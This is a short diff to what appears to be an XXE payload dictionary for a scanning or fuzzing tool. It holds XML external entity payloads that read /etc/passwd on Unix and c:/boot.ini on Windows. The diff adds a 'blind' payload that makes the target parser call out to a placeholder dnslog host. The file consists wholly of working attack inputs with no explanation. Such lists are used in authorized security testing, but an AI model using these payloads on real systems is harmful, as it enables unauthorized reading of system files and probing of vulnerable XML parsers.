@@ -1,7 +1,10 @@
 # XXE dict
 
-# for Unix
+# for Unix target
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 
-# for Windows
+# for Windows target
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/boot.ini"> ]>
+
+# blind
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://dnslog"> ]>
